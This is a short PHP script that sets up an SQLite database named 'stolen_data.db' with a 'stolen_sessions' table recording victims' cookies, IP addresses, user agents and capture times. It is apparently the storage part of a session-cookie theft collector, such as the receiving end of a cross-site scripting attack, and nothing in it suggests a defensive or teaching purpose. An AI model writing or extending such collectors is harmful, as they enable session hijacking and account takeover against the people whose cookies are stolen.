<?php
$db = new SQLite3('stolen_data.db');

$db->exec("CREATE TABLE IF NOT EXISTS stolen_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cookie TEXT,
    ip TEXT,
    user_agent TEXT,
    stolen_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
?>